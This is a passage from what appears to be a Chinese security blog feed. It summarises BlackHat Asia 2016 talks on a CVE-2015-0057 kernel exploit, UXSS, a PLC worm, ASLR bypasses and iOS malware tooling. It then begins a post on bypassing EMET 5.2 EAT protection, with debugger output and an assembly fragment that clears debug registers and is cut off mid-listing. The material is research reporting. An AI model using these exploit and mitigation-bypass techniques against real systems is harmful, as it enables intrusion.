    <content type="html">&lt;h2 id=&quot;1、《A-New-CVE-2015-0057-Exploit-Technology》&quot;&gt;&lt;a href=&quot;#1、《A-New-CVE-2015-0057-Exploit-Technology》&quot; class=&quot;headerlink&quot; title=&quot;1、《A New CVE-2015-0057 Exploit Technology》&quot;&gt;&lt;/a&gt;1、《A New CVE-2015-0057 Exploit Technology》&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598336783953.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自FireEye公司分享的一种针对微软内核 win32k!xxxEnableWndSBArrows tagSBINFO/tagPROPLIST UAF漏洞CVE-2015-0057/MS15-010的利用方法，是被FireEye捕获到的一款Dyre银行木马变种所采用的利用技术,分为32位和64位不同平台下的方法。&lt;br&gt;&lt;strong&gt;【传统攻击方法】&lt;/strong&gt;：原有的攻击方法是由NCC Group安全组织公布的，采用”占坑“的攻击方式，用可控数据去填充已释放的tagPROPLIST，然后在32位下用SetScrollInfo去操作指向tagWND.strName.Buffer的tagWND.pSBInfo，而在64位下伪造的堆头结构_HEAP_ENTRY去指向tagWND.strName.Buffer，完成数据的覆盖，从而转化为任意地址读写。&lt;br&gt;&lt;strong&gt;【新型攻击方法】&lt;/strong&gt;：在32位系统下，== 采用tagMENU对象去填充已tagPROPLIST，然后借助tagMENU.cItems和tagMENU.rgItems来完成控制 ==;而在64位系统下，既借鉴了NCC使用tagWND去操作tagPROPLIST，又使用tagMENU去覆盖tagMENU.rgItems，因为rgItems数组指针指向的第一个元素是wID，通过SetMenuItemInfo()可实现完全控制,最终实现任意地址读写。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》&quot;&gt;&lt;a href=&quot;#2、《Automated-Detection-Of-Firefox-Extension-reuse-Vulnerabilities》&quot; class=&quot;headerlink&quot; title=&quot;2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》&quot;&gt;&lt;/a&gt;2、《Automated Detection Of Firefox Extension-reuse Vulnerabilities》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598369926110.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;东北大学（美国）的4位安全研究员开发出一款叫CrossFire的轻量级静态分析工具，用于自动化挖掘Firefox插件漏洞（对方称为”Externsion-reuse“漏洞），其实就是利用插件原有的敏感功能去执行恶意行为，比如窃取cookie、历史记录等敏感信息。Firefox插件是通过Javascript调用Friefox提供的API实现的附加功能，因此CrossFire是通过静态分析插件的JS代码，构建出抽象语法树，然后跟收集的敏感API数据库做综合分析，API数据库就是定义输入源（source）和输出目标（sink）的内容，然后基于污点传播的思路去做判断，如果检测到漏洞还可以根据原定规则生成exploit。&lt;br&gt;&lt;strong&gt;【PS】&lt;/strong&gt;:==基于污点传播的静态分析思路，偏学术研究，估计误报会比较多，往往还需要人工介入排查，效果不见得会很好。==&lt;/p&gt;
&lt;h3 id=&quot;3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》&quot;&gt;&lt;a href=&quot;#3、《Break-Out-Of-The-Truman-Show：Active-Detection-And-Escape-Of-Dynamic-Binary-Instrumentation》&quot; class=&quot;headerlink&quot; title=&quot;3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》&quot;&gt;&lt;/a&gt;3、《Break Out Of The Truman Show：Active Detection And Escape Of Dynamic Binary Instrumentation》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598401954245.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;关于动态二进制插桩的检测与逃逸方法，用来对抗程序被动态分析,主要针对PIN与DynamoRIO两款插桩工具的特点进行分析。&lt;br&gt;&lt;strong&gt;【检测方法】&lt;/strong&gt;：分主动与被动检测方案，主动检测包括扩展的指令代码（Xmode Code，会导致栈桢大小不同）、代码缓存、TLS和异常上下文，而被动检测包括未支持的指令和行为功能。&lt;br&gt;&lt;strong&gt;【逃逸方法】&lt;/strong&gt;：通过代码缓存进行自修改，以及一些栈、TLS和其它DBI框架特有的数据结构，比如.charmve段、BrokerClient回调函数等等方法入手。&lt;/p&gt;
&lt;h3 id=&quot;4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》&quot;&gt;&lt;a href=&quot;#4、《Bypassing-Browser-Security-Policies-For-Fun-And-Profit》&quot; class=&quot;headerlink&quot; title=&quot;4、《Bypassing Browser Security Policies For Fun And Profit》&quot;&gt;&lt;/a&gt;4、《Bypassing Browser Security Policies For Fun And Profit》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598412838122.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;讲述Android浏览器绕过同源策略的UXSS漏洞，都是以一些历史漏洞为例讲解漏洞的利用方式（含PoC）,包括窃取cookie、读取本地文件，以及绕过Google Play的限制实现任意app的安装。==议题主要是对过去漏洞的总结，并没有太多新颖的思路。==&lt;/p&gt;
&lt;h3 id=&quot;5、《DSCompromised-A-Windows-DSC-Attack-Framework》&quot;&gt;&lt;a href=&quot;#5、《DSCompromised-A-Windows-DSC-Attack-Framework》&quot; class=&quot;headerlink&quot; title=&quot;5、《DSCompromised: A Windows DSC Attack Framework》&quot;&gt;&lt;/a&gt;5、《DSCompromised: A Windows DSC Attack Framework》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598431026382.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;DSC（Desired State Configuration，期望状态配置）是Windows上的配置管理平台，它通过向PowerShell语言中引进一个非常简单的语法声明，和一个用来接收和应用这些配置的内置引擎来实现的。DSCompromised即是一款基于PowerShell的工具，用于借助DSC来实现命令控制、恶意软件驻留、回连后门等等功能。该工具已在github上开源：&lt;a href=&quot;https://github.com/matthastings/DSCompromised。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/matthastings/DSCompromised。&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》&quot;&gt;&lt;a href=&quot;#6、《Enterprise-Apps-Bypassing-The-iOS-Gatekeeper》&quot; class=&quot;headerlink&quot; title=&quot;6、《Enterprise Apps: Bypassing The iOS Gatekeeper》&quot;&gt;&lt;/a&gt;6、《Enterprise Apps: Bypassing The iOS Gatekeeper》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598447131786.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;介绍iOS企业证书滥用的问题，并列举近年来出现过一些大的iOS安全事件，比如”假面攻击“、WireLurker病毒等等案例，同时讲述其它存在的风险，==比如通过中间人方式去劫持企业的移动设备管理服务器，然后替换请求安装的app，从而使得用户安装被企业证书签名过的恶意软件==。&lt;/p&gt;
&lt;h3 id=&quot;7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》&quot;&gt;&lt;a href=&quot;#7、《Exploiting-Linux-and-PaX-ASLR’s-weaknesses-on-32-bit-and-64-bit-systems》&quot; class=&quot;headerlink&quot; title=&quot;7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》&quot;&gt;&lt;/a&gt;7、《Exploiting Linux and PaX ASLR’s weaknesses on 32-bit and 64-bit systems》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598465162889.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;列举出当前Linux和PaX(用于安全加固的Linux内核补丁)平台上的ASLR绕过漏洞，共有4个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==低熵==，即地址随机度不够，可被暴力破解，尤其是32位系统&lt;/li&gt;
&lt;li&gt;==非均匀分布随机地址==，呈驼峰型分布，因此有部分地址存在高命中率&lt;/li&gt;
&lt;li&gt;==利用对象间的相对地址偏移实现绕过==，即Offset2Lib攻击方法&lt;/li&gt;
&lt;li&gt;==进程继承缺陷==，所有子进程共享相同的内存&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后提出下一代ASLR防护机制：ASLR-NG，以解决上述问题。&lt;/p&gt;
&lt;h3 id=&quot;8、《Hacking-a-Professional-Drone》&quot;&gt;&lt;a href=&quot;#8、《Hacking-a-Professional-Drone》&quot; class=&quot;headerlink&quot; title=&quot;8、《Hacking a Professional Drone》&quot;&gt;&lt;/a&gt;8、《Hacking a Professional Drone》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598494382580.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;议题中提出两种攻击无人机的方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==破解WEP加密的WiFi密码==，直接接入与遥控器通讯；&lt;/li&gt;
&lt;li&gt;==伪造XBee 868LP通讯设备作为中间人==，发送控制指令（逆向Android客户端获得指令序列），从而实现无人机的劫持&lt;br&gt;&lt;strong&gt;【PS】&lt;/strong&gt;：==从攻击难度看，此款无人机的安全性比较低，跟大疆无人机存在较大差距==。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》&quot;&gt;&lt;a href=&quot;#9、《Hey-your-parcel-looks-bad-fuzzing-and-exploiting-parcel-ization-vulnerabilities-in-Android》&quot; class=&quot;headerlink&quot; title=&quot;9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》&quot;&gt;&lt;/a&gt;9、《Hey your parcel looks bad - fuzzing and exploiting parcel-ization vulnerabilities in Android》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599077404076.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;由于KeenLab分享的Android Binder Fuzzing相关的议题，分析出Binder存在的攻击面，然后制定相应的Fuzzing策略。&lt;br&gt;&lt;strong&gt;【亮点一】&lt;/strong&gt;：==从Android C++源码中自动化提取各Binder服务通讯中的 Transaction Code、参数类型及序号、远程服务的调用方式，然后生成json文件，依据它来作参数变异==。如果是闭源的Binder服务，比如华为手机，则通过IDAPython从程序中提取上述信息。&lt;br&gt;&lt;strong&gt;【亮点二】&lt;/strong&gt;：==开启ASAN（AddressSanitize）去编译源码==，加强程序自主的错误检测能力，同时==结合AFL==（Google开发的一款基于源码插桩的Fuzzer工具，曾被用于刷过N多CVE漏洞）去做Fuzzing，==但AFL是基于文件输入的，而Binder未提供此功能，因此KeenLab也未完全实现，这是他们一直在尝试做的工作==。&lt;br&gt;&lt;strong&gt;【亮点三】&lt;/strong&gt;：最后以几个Binder服务漏洞作为实例分析漏洞成因，并分享了CVE-2015-6620 MediaCodecInfo 越界访问漏洞的利用技巧，采用ROP与Heap Spray去绕过NX与ASLR。&lt;/p&gt;
&lt;h3 id=&quot;10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》&quot;&gt;&lt;a href=&quot;#10、《I’m-Not-a-Human-Breaking-the-Google-reCAPTCHA》&quot; class=&quot;headerlink&quot; title=&quot;10、《I’m Not a Human: Breaking the Google reCAPTCHA》&quot;&gt;&lt;/a&gt;10、《I’m Not a Human: Breaking the Google reCAPTCHA》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599122751659.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Google的reCAPTCHA是一款验证码生成系统，作者分享了一些绕过该验证码系统的方法。比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过深度学习为图片注释，使用基于Word2Vec神经网络进行深度学习去为图片标记归类&lt;/li&gt;
&lt;li&gt;收集样本图片、提示信息、注释标签等信息&lt;/li&gt;
&lt;li&gt;通过Google服务（图片搜索、翻译等）获取关键词&lt;/li&gt;
&lt;li&gt;……&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》&quot;&gt;&lt;a href=&quot;#11、《Let’s-See-What’s-Out-There-Mapping-The-Wireless-IOT》&quot; class=&quot;headerlink&quot; title=&quot;11、《Let’s See What’s Out There - Mapping The Wireless IOT》&quot;&gt;&lt;/a&gt;11、《Let’s See What’s Out There - Mapping The Wireless IOT》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599134045481.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享物联网产品中常用的无线电安全问题，比如ZigBee、WiFi、GSM、NFC、车钥匙信号等等。介绍分析无线电的硬件、软件工具，以及常见的TOP 10无线安全问题，前3名分别是：未加密通讯、信息重放攻击、密钥交换漏洞。&lt;br&gt;==【PS】:主要是无线电安全的基础知识的概述，工具和常见漏洞类型等等，无实例漏洞分析，里面涉及的内容，预研侧此前大多有分析过。==&lt;/p&gt;
&lt;h3 id=&quot;12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》&quot;&gt;&lt;a href=&quot;#12、《PLC-Blaster：A-Worm-Living-Solely-in-the-PLC》&quot; class=&quot;headerlink&quot; title=&quot;12、《PLC-Blaster：A Worm Living Solely in the PLC》&quot;&gt;&lt;/a&gt;12、《PLC-Blaster：A Worm Living Solely in the PLC》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599217768327.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者开发出一款叫PLC-Blaster的PLC（可编程控制器）蠕虫病毒，以西门子S7-1200版本1到3的PLC为例。西门子PLC使用自定义协议去上传和下载用户程序到PLC，也可以读取PLC相关诊断信息，因此常被用作攻击PLC的手段之一。此款PLC病毒使用SCL编程语言实现的，它会去扫描本地网络，若发现其它PLC则会上传病毒进行感染，实现自我传播的功能。同时它还会主动连接C&amp;amp;C服务器，以实现远程控制功能。&lt;br&gt;==【PS】：难点就在于对S7-1200 PLC的协议分析，只有分析清楚之后，才能使用SCL去实现自我传播的功能。==&lt;/p&gt;
&lt;h3 id=&quot;13、《Practical-New-Developments-In-The-BREACH-Attack》&quot;&gt;&lt;a href=&quot;#13、《Practical-New-Developments-In-The-BREACH-Attack》&quot; class=&quot;headerlink&quot; title=&quot;13、《Practical New Developments In The BREACH Attack》&quot;&gt;&lt;/a&gt;13、《Practical New Developments In The BREACH Attack》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599232870147.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享关于SSL BREACH（超文本自适应压缩浏览器勘测与渗透）攻击方法的新进展，BREACH攻击方法最初是在&lt;a href=&quot;http://breachattack.com/resources/BREACH%20-%20SSL,%20gone%20in%2030%20seconds.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;BlackHat USA 2013大会&lt;/a&gt;被公布的。作者开发出一款叫”rupture“的攻击框架，并在&lt;a href=&quot;https://github.com/dionyziz/rupture&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;github&lt;/a&gt;上开源，用于实现改进后的BREACH攻击，以及针对其它压缩加密算法的攻击。&lt;/p&gt;
&lt;h3 id=&quot;14、《The-Perl-Jam-2-The-Camel-Strikes-Back》&quot;&gt;&lt;a href=&quot;#14、《The-Perl-Jam-2-The-Camel-Strikes-Back》&quot; class=&quot;headerlink&quot; title=&quot;14、《The Perl Jam 2: The Camel Strikes Back》&quot;&gt;&lt;/a&gt;14、《The Perl Jam 2: The Camel Strikes Back》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599279606791.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Perl在之前被发现存在多个高危漏洞，而官方一直将问题归结于开发者，作者表示很气愤，认为这个锅不应该由开发者来背。于是，作者分享了他发现的存在于perl核心模块0day漏洞，此漏洞影响所有使用perl开发CGI的程序，可造成远程代码执行。&lt;/p&gt;
&lt;h3 id=&quot;15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》&quot;&gt;&lt;a href=&quot;#15、《Su-A-Cyder：Homebrewing-Malware-For-iOS-Like-A-B0SS》&quot; class=&quot;headerlink&quot; title=&quot;15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》&quot;&gt;&lt;/a&gt;15、《Su-A-Cyder：Homebrewing Malware For iOS Like A B0SS》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599250665173.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;分享==非越狱iOS平台==上的恶意软件相关的议题，列举过去的发生的一些案例，然后总结出一些恶意软件的常用工具和方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;==重打包==：在正常应用中加入恶意代码，然后重新签名打包&lt;/li&gt;
&lt;li&gt;==Dylib注入==&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/BishopFox/theos-jailed&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Cycript&lt;/a&gt;：支持javascript和OC语法的解析工具，可用于调试运行时程序，支持越狱与非越狱平台&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/BishopFox/theos-jailed&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Theos&lt;/a&gt;：iOS平台上的Hook框架，支持越狱与非越狱平台，但仍需要开发者帐号用于签名，详见：====&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/fastlane/fastlane&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Fastlane tools&lt;/a&gt;：iOS开发的持续集成框架，用于实现实现应用发布流程的自动化。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后作者开源出一款叫”==&lt;a href=&quot;https://github.com/fastlane/fastlane&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Su-A-Cyder&lt;/a&gt;==“的iOS恶意软件生成工具，后面作者还打算尝试将Metasploit移植到未越狱的iOS平台上。&lt;/p&gt;
&lt;h3 id=&quot;16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》&quot;&gt;&lt;a href=&quot;#16、《The-Security-Wolf-Of-Wall-Street-Fighting-Crime-With-High-Frequency-Classfication-And-Natural-Language-Processing》&quot; class=&quot;headerlink&quot; title=&quot;16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》&quot;&gt;&lt;/a&gt;16、《The Security Wolf Of Wall Street: Fighting Crime With High-Frequency Classfication And Natural Language Processing》&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14599283806453.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者分享了如何利用深度学习与自然语言处理去建立一个基于实时分析海量DNS数据的威胁监控框架，主要用于检测恶意钓鱼的域名站点，并发现了不少伪造Google、Apple、Paypal等知名站点的钓鱼网站。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、《A-New-CVE-2015-0057-Exploit-Technology》&quot;&gt;&lt;a href=&quot;#1、《A-New-CVE-2015-0057-Exploit-Technology》&quot; class=&quot;headerlink&quot; title=&quot;1、《A New CVE-2015-0057 Exploit Technology》&quot;&gt;&lt;/a&gt;1、《A New CVE-2015-0057 Exploit Technology》&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/media/bh-asia-2016/14598336783953.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;来自FireEye公司分享的一种针对微软内核 win32k!xxxEnableWndSBArrows tagSBINFO/tagPROPLIST UAF漏洞CVE-2015-0057/MS15-010的利用方法，是被FireEye捕获到的一款Dyre银行木马变种所采用的利用技术,分为32位和64位不同平台下的方法。&lt;br&gt;&lt;strong&gt;【传统攻击方法】&lt;/strong&gt;：原有的攻击方法是由NCC Group安全组织公布的，采用”占坑“的攻击方式，用可控数据去填充已释放的tagPROPLIST，然后在32位下用SetScrollInfo去操作指向tagWND.strName.Buffer的tagWND.pSBInfo，而在64位下伪造的堆头结构_HEAP_ENTRY去指向tagWND.strName.Buffer，完成数据的覆盖，从而转化为任意地址读写。&lt;br&gt;&lt;strong&gt;【新型攻击方法】&lt;/strong&gt;：在32位系统下，== 采用tagMENU对象去填充已tagPROPLIST，然后借助tagMENU.cItems和tagMENU.rgItems来完成控制 ==;而在64位系统下，既借鉴了NCC使用tagWND去操作tagPROPLIST，又使用tagMENU去覆盖tagMENU.rgItems，因为rgItems数组指针指向的第一个元素是wID，通过SetMenuItemInfo()可实现完全控制,最终实现任意地址读写。&lt;br&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="BlackHat" scheme="http://riusksk.github.io/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>绕过最新版 EMET 5.2 保护摘要</title>
    <link href="http://riusksk.github.io/2015/06/04/%E7%BB%95%E8%BF%87%E6%9C%80%E6%96%B0%E7%89%88-EMET-5-2-%E4%BF%9D%E6%8A%A4%E6%91%98%E8%A6%81/"/>
    <id>http://riusksk.github.io/2015/06/04/绕过最新版-EMET-5-2-保护摘要/</id>
    <published>2015-06-03T16:00:00.000Z</published>
    <updated>2016-08-07T06:26:05.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;绕过EMET-5-2-EAT保护：&quot;&gt;&lt;a href=&quot;#绕过EMET-5-2-EAT保护：&quot; class=&quot;headerlink&quot; title=&quot;绕过EMET 5.2 EAT保护：&quot;&gt;&lt;/a&gt;绕过EMET 5.2 EAT保护：&lt;/h3&gt;&lt;h4 id=&quot;【保护原理】&quot;&gt;&lt;a href=&quot;#【保护原理】&quot; class=&quot;headerlink&quot; title=&quot;【保护原理】&quot;&gt;&lt;/a&gt;【保护原理】&lt;/h4&gt;&lt;p&gt;分别对ntdll、kernel32和kernelbase的EAT基址下断点，断点地址记录在调试寄存器dr0、dr1、dr2、dr3上，dr6保存最新调试异常的状态信息，dr7包含4个断点的设置，当利用漏洞去调用EAT时就会触发中断。&lt;/p&gt;
&lt;p&gt;开启EAT保护前：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; rM 20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dr0=00000000 dr1=00000000 dr2=00000000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dr3=00000000 dr6=00000000 dr7=00000000&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpDoDebuggerBreak+0x2c:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76f3103b cc              int     3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;开启EAT保护后：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;0:000&amp;gt; rM 20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dr0=76ea0204 dr1=7645ff8c dr2=7628b85c&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dr3=00000000 dr6=ffff0ff2 dr7=0fff0115&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ntdll!LdrpSnapThunk+0x1c1:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76ec01ae 03c2            add     eax,edx&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;【绕过方法】&quot;&gt;&lt;a href=&quot;#【绕过方法】&quot; class=&quot;headerlink&quot; title=&quot;【绕过方法】&quot;&gt;&lt;/a&gt;【绕过方法】&lt;/h4&gt;&lt;p&gt;通过构造异常触发，来构造寄存器上下文，防止后面因dr寄存器清空也触发异常。&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mov     eax, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;h     ; 指向服务号，防止异常处理失效&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor     ecx, ecx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sub     esp, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;cch                       ; makes space &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; CONTEXT&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     dword ptr [esp], &lt;span class=&quot;number&quot;&gt;10010&lt;/span&gt;h         ; CONTEXT_DEBUG_REGISTERS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     dword ptr [esp + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;], ecx        ; context.Dr0 = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov     dword ptr [esp + &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;], ecx        ; context.Dr1 = &lt;span 